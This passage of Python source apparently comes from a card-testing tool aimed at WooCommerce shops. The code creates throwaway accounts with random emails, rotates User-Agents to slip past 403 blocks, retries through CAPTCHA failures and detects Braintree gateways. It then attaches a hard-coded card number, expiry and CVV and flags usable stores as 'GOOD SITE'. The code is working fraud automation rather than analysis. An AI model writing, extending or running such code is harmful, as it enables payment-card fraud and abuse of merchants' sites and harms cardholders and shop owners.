                elif is_required:
                    # email_2 is confirmation field - will fill with same email
                    required_fields[field_name] = ''  # Will fill with same email
            
            # Username field - only include if explicitly required
            elif 'user' in name_lower and 'name' in name_lower:
                username_field_name = field_name
                if is_required:
                    required_fields[field_name] = ''
            
            # Password field - only include if explicitly required or is password type
            elif 'pass' in name_lower or itype == 'password':
                password_field_name = field_name
                if is_required or itype == 'password':
                    required_fields[field_name] = ''
        
        # Generate credentials based on what's needed
        random_email = generate_random_email()
        random_username = generate_random_username()
        random_password = generate_random_password()
        
        # Build form data with only required fields
        form_data = hidden_fields.copy()  # Start with hidden fields (nonces, etc.)
        
        # Fill required fields
        if email_field_name:
            # Always include email if email field is found (most forms need it)
            if email_field_name not in required_fields:
                required_fields[email_field_name] = ''  # Add it if not already there
            form_data[email_field_name] = random_email
            _debug(f"Form requires: email ({email_field_name})")
        
        if username_field_name and username_field_name in required_fields:
            form_data[username_field_name] = random_username
            _debug(f"Form requires: username ({username_field_name})")
        
        if password_field_name and password_field_name in required_fields:
            form_data[password_field_name] = random_password
            _debug(f"Form requires: password ({password_field_name})")
        
        # Fill email_2 if present and required
        if 'email_2' in required_fields:
            form_data['email_2'] = random_email
            _debug(f"Form requires: email_2 (confirmation)")
        
        # If no required fields detected but email field exists, use email only (like outlet.lagunatools.com)
        if not required_fields and email_field_name:
            form_data[email_field_name] = random_email
            _debug(f"Only email field found - sending email only: {email_field_name}")
        
        _debug(f"Form analysis complete - sending only required fields: {list(form_data.keys())}")
        
        # Get form action URL
        form_action = registration_form.get('action')
        if form_action:
            submit_url = urljoin(register_url, form_action)
        else:
            submit_url = register_url
        
    except Exception as e:
        _debug(f"Error analyzing registration form: {e}")
        return None
    
    # Retry loop with email validation error and CAPTCHA error handling
    email_retry_count = 0
    max_email_retries = 1
    
    for attempt in range(1, max_retries + 1):
        if attempt > 1:
            _debug(f"Retry attempt {attempt}/{max_retries}...")
            _human_pause(min_s=1.5, max_s=3.0)
        
        try:
            _debug(f"Registration attempt {attempt}/{max_retries} - submitting to: {submit_url}")
            _debug(f"Sending fields: {list(form_data.keys())}")
            
            # Submit the form (even if CAPTCHA is present - just send email and submit)
            post_headers = {
                "User-Agent": UserAgent().random,
                "Referer": register_url,
                "Content-Type": "application/x-www-form-urlencoded",
            }
            
            resp = sess.post(submit_url, headers=post_headers, data=form_data, timeout=15, verify=False, allow_redirects=True)
            
            # Check response for error messages
            response_soup = BeautifulSoup(resp.text, "html.parser")
            error_messages = []
            
            # Look for WooCommerce error messages
            error_ul = response_soup.find('ul', class_='woocommerce-error')
            if error_ul:
                error_messages = [li.get_text(strip=True) for li in error_ul.find_all('li')]
                _debug(f"Registration errors found: {error_messages}")
            
            # Check if error is email validation error
            email_error = any('valid email' in err.lower() or 'please provide a valid email' in err.lower() 
                            for err in error_messages)
            
            # Check if error is reCAPTCHA-related
            recaptcha_error = any('recaptcha' in err.lower() or 'captcha' in err.lower() for err in error_messages)
            
            # If email validation error and we haven't retried with realistic email yet
            if email_error and email_retry_count < max_email_retries:
                _debug(f"[-] Email validation error detected: {error_messages}")
                _debug(f"Retrying with realistic email format (attempt {email_retry_count + 1}/{max_email_retries})...")
                
                # Generate realistic email and update form data
                random_email = generate_realistic_email()
                if email_field_name:
                    form_data[email_field_name] = random_email
                if 'email_2' in form_data:
                    form_data['email_2'] = random_email
                _debug(f"Using realistic email: {random_email}")
                email_retry_count += 1
                continue  # Retry with new email
            
            if resp.status_code in (200, 302):
                # Check response content for success indicators first
                response_text = resp.text.lower()
                has_success_message = any(indicator in response_text for indicator in [
                    'registration successful', 'account created', 'check your email',
                    'password reset link', 'dashboard', 'my account dashboard'
                ])
                
                # Check for error messages in response (even with HTTP 200)
                if error_messages or recaptcha_error:
                    _debug(f"[-] Registration response contains errors (HTTP {resp.status_code}): {error_messages}")
                    if recaptcha_error:
                        _debug(f"[-] Registration failed due to reCAPTCHA requirement (attempt {attempt}/{max_retries})")
                        if attempt < max_retries:
                            _debug("Will retry clicking register again (same session, same email)...")
                            continue  # Retry with same session
                        else:
                            _debug("⚠️  All retry attempts exhausted. reCAPTCHA solving service may be required.")
                            return None
                    elif attempt < max_retries:
                        _debug("Will retry registration...")
                        continue
                    return None
                
                # If no errors and has success message, might be successful
                if has_success_message:
                    _debug(f"[+] Registration POST successful (HTTP {resp.status_code}): {random_email}")
                    time.sleep(1)  # Small delay before verification
                    if verify_registration_success(sess, register_url):
                        _debug(f"[+] Registration verified: {random_email}")
                        return sess
                
                # Verify registration was truly successful
                _debug(f"[+] Registration POST returned HTTP {resp.status_code}: {random_email}")
                time.sleep(1)  # Small delay before verification
                if verify_registration_success(sess, register_url):
                    _debug(f"[+] Registration verified: {random_email}")
                    return sess
                else:
                    # If verification failed, check if it's due to reCAPTCHA
                    if recaptcha_error:
                        _debug(f"[-] Registration failed due to reCAPTCHA requirement (attempt {attempt}/{max_retries})")
                        if attempt < max_retries:
                            _debug("Will retry clicking register again (same session, same email)...")
                            continue  # Retry with same session
                        else:
                            _debug("⚠️  All retry attempts exhausted. reCAPTCHA solving service may be required.")
                            return None
                    else:
                        _debug(f"[-] Registration verification failed: Registration form still exists")
                        # Check response for more clues
                        response_text = resp.text.lower()
                        if 'error' in response_text or 'invalid' in response_text:
                            _debug(f"Response contains error indicators, will retry...")
                        if attempt < max_retries:
                            _debug("Will retry registration...")
                            continue
                        return None
            
                _debug(f"[-] Registration failed: HTTP {resp.status_code}")
                if error_messages:
                    _debug(f"Error details: {'; '.join(error_messages[:2])}")
                
                # If reCAPTCHA error and we have retries left, continue (same session)
                if recaptcha_error and attempt < max_retries:
                    _debug("reCAPTCHA error detected, will retry clicking register again (same session)...")
                    continue
            
        except Exception as e:
            _debug(f"Error during registration (attempt {attempt}): {e}")
            if attempt < max_retries:
                continue
            return None

    return None


def check_site_card_form(base_url: str, check_braintree_public: bool = True) -> dict:
    """
    SIMPLE checker:
      - Visit base_url + /my-account/
      - If a register section/form is found on that page, return the site's base URL.
      - Optionally checks for Braintree on public pages (no registration needed).
    Returns dict with:
      {
        "register_found": bool,
        "base_url": str,
        "details": str,
        "braintree_info": dict (if check_braintree_public is True)
      }
    """
    _debug(f"Starting check for: {base_url}")
    base_url = extract_base_url(base_url) or base_url
    _debug(f"Using base URL: {base_url}")

    session = requests.Session()
    session.headers["User-Agent"] = UserAgent().random

    account_url = urljoin(base_url.rstrip("/") + "/", "my-account/")
    _debug(f"Account URL: {account_url}")

    # Step 1: Visit /my-account to see if registration/login is required.
    # Retry multiple times on errors (403, network errors, etc.)
    resp = None
    error = None
    max_retries = 5  # Retry up to 5 times
    
    for attempt in range(1, max_retries + 1):
        try:
            _debug(f"Requesting /my-account/ (attempt {attempt}/{max_retries}) ...")
            if attempt > 1:
                # Longer pause between retries
                pause_time = min(2 + (attempt - 1) * 1, 5)  # 2s, 3s, 4s, 5s, 5s
                _debug(f"Waiting {pause_time}s before retry...")
                time.sleep(pause_time)
            else:
                _human_pause()
            
            resp = session.get(account_url, timeout=15, verify=False, allow_redirects=True)
            
            # Check for 403 Forbidden - retry with different headers
            if resp.status_code == 403:
                _debug(f"403 Forbidden on attempt {attempt} - trying with different User-Agent...")
                # Try with different User-Agent
                session.headers["User-Agent"] = UserAgent().random
                time.sleep(2)
                resp = session.get(account_url, timeout=15, verify=False, allow_redirects=True)
            
            resp.raise_for_status()
            _debug(f"✓ Successfully accessed /my-account/ on attempt {attempt}")
            break
        except requests.exceptions.HTTPError as e:
            error = e
            status_code = e.response.status_code if hasattr(e, 'response') and e.response else None
            _debug(f"HTTP Error {status_code} accessing /my-account/ on attempt {attempt}: {e}")
            if status_code == 403 and attempt < max_retries:
                _debug("403 Forbidden - will retry with different approach...")
                # Update User-Agent for next retry
                session.headers["User-Agent"] = UserAgent().random
                continue
        except Exception as e:
            error = e
            _debug(f"ERROR accessing /my-account/ on attempt {attempt}: {e}")
            if attempt < max_retries:
                _debug("Will retry...")
                continue

    if resp is None:
        result = {
            "register_found": False,
            "base_url": base_url,
            "details": f"DEAD: Failed to access /my-account/ after {max_retries} attempts -> {str(error)}",
        }
        return result

    soup = BeautifulSoup(resp.text, "html.parser")
    
    # Check for captcha on the page
    has_captcha = False
    if 'recaptcha' in resp.text.lower() or 'g-recaptcha' in resp.text.lower() or \
       soup.find('div', class_=re.compile(r'recaptcha|g-recaptcha', re.I)) or \
       soup.find('div', id=re.compile(r'recaptcha|g-recaptcha', re.I)):
        has_captcha = True
        _debug("⚠️  CAPTCHA detected on /my-account/ page")
    
    # Check for Braintree on /my-account/ page itself (scripts, styles, etc.)
    # This is accessible without registration and often contains Braintree references
    # Examples: <script id="braintree-js-client-js">, <link id="wc-braintree-styles-css">
    braintree_info = None
    if check_braintree_public:
        _debug("Checking /my-account/ page for Braintree references (searching for 'braintree' in HTML)...")
        
        # SOLID Braintree detection - check scripts/link tags FIRST (most reliable)
        # Check for Braintree in script/link tags (like braintree-js-client-js, wc-braintree-styles-css)
        braintree_scripts = soup.find_all(['script', 'link'], id=re.compile(r'braintree', re.I))
        braintree_links = soup.find_all(['script', 'link'], src=re.compile(r'braintree', re.I))
        braintree_hrefs = soup.find_all(['script', 'link'], href=re.compile(r'braintree', re.I))
        
        # Also check for braintreegateway.com domains
        braintree_domains = soup.find_all(['script', 'link'], src=re.compile(r'braintreegateway\.com|js\.braintreegateway\.com', re.I))
        braintree_domains_href = soup.find_all(['script', 'link'], href=re.compile(r'braintreegateway\.com|js\.braintreegateway\.com', re.I))
        
        all_braintree_tags = braintree_scripts + braintree_links + braintree_hrefs + braintree_domains + braintree_domains_href
        
        if all_braintree_tags:
            _debug(f"✅ Braintree scripts/styles found on /my-account/ page (SOLID detection)")
            # Try to determine type from the script/link
            detected_type = "braintree_cc"  # Default
            for tag in all_braintree_tags:
                tag_str = str(tag).lower()
                if 'credit_card' in tag_str or 'credit-card' in tag_str or 'wc-braintree-credit-card' in tag_str:
                    detected_type = "braintree_credit_card"
                    _debug(f"Detected type: braintree_credit_card from tag")
                    break
                elif 'paypal' in tag_str or 'wc-braintree-paypal' in tag_str:
                    detected_type = "braintree_paypal"
                    _debug(f"Detected type: braintree_paypal from tag")
                    break
            
            braintree_info = {
                "has_braintree": True,
                "braintree_type": detected_type,
                "detected_on": "my-account",
                "details": f"Braintree scripts/styles detected on /my-account/ page"
            }
        else:
            # Fallback: use existing detection function
            braintree_type = detect_braintree_type(resp.text)
            if braintree_type != 'none':
                _debug(f"✅ Braintree detected on /my-account/ page via detect_braintree_type: {braintree_type}")
                braintree_info = {
                    "has_braintree": True,
                    "braintree_type": braintree_type,
                    "detected_on": "my-account",
                    "details": f"Braintree ({braintree_type}) detected on /my-account/ page"
                }
            else:
                # Check for braintree in page text/HTML (simple search)
                if 'braintree' in resp.text.lower() or 'braintreegateway.com' in resp.text.lower() or 'js.braintreegateway.com' in resp.text.lower():
                    _debug(f"✅ Braintree references found in /my-account/ page HTML")
                    braintree_info = {
                        "has_braintree": True,
                        "braintree_type": "braintree_cc",  # Can't determine exact type from text search
                        "detected_on": "my-account",
                        "details": f"Braintree references found in /my-account/ page HTML"
                    }
                else:
                    _debug("No Braintree detected on /my-account/ page")
                    braintree_info = {
                        "has_braintree": False,
                        "braintree_type": "none",
                        "detected_on": None,
                        "details": "No Braintree detected on /my-account/ page"
                    }

    # Some sites first show only a REGISTER button; click it once to reveal the real form
    soup = _maybe_click_register_button_first(session, account_url, soup)

    registration_form = _find_registration_form(soup)
    if registration_form is not None:
        _debug("Registration section/form detected on /my-account/.")
        
        # Actually register a new account
        _debug("Attempting to register new account...")
        # TEMPORARY: Use Selenium to see what's happening
        playwright_success, playwright_cookies = register_new_account_selenium(account_url, max_retries=3, session=session)
        if playwright_success and playwright_cookies:
            # Playwright registration succeeded - transfer cookies to requests session
            registered_session = session or requests.Session()
            # Update session with cookies from Playwright
            for cookie_name, cookie_value in playwright_cookies.items():
                registered_session.cookies.set(cookie_name, cookie_value)
            _debug(f"Transferred {len(playwright_cookies)} cookies from Playwright to requests session")
        elif playwright_success:
            # Success but no cookies (shouldn't happen, but handle it)
            registered_session = session or requests.Session()
        else:
            registered_session = None
        
        if registered_session:
            print("done register")
            _debug("Registration successful!")
            
            # Small delay to ensure session is established
            time.sleep(1)
            
            # Now try to add payment method
            _debug("Attempting to add payment method...")
            payment_result = add_payment_method_braintree(
                registered_session, base_url, 
                card_number="4895040596803748",
                exp_month="01",
                exp_year="2031",
                cvv="105"
            )
            
            result = {
                "register_found": True,
                "base_url": base_url,
                "details": f"REGISTER FOUND and ACCOUNT CREATED on /my-account/ for base URL: {base_url}",
                "session": registered_session,
                "payment_result": payment_result,
                "has_captcha": has_captcha,
            }
            
            # Add Braintree info if available
            if braintree_info:
                result["braintree_info"] = braintree_info
            
            # If it's a good site (address error), mark it
            if payment_result.get("is_good_site"):
                result["is_good_site"] = True
                result["details"] += f" | GOOD SITE - Braintree type: {payment_result.get('braintree_type')} | {payment_result.get('message', '')}"
                _debug("✅ GOOD SITE DETECTED - Address required!")
            
            return result
        else:
            _debug("Registration failed, but form was detected.")
            result = {
                "register_found": True,
                "base_url": base_url,
                "details": f"REGISTER FOUND on /my-account/ but registration failed for base URL: {base_url}",
                "has_captcha": has_captcha,
            }
            if braintree_info:
                result["braintree_info"] = braintree_info
            return result

    _debug("No registration section/form detected on /my-account/.")
    result = {
        "register_found": False,
        "base_url": base_url,
        "details": "No registration section found on /my-account/.",
        "has_captcha": has_captcha,
    }
    if braintree_info:
        result["braintree_info"] = braintree_info
    return result
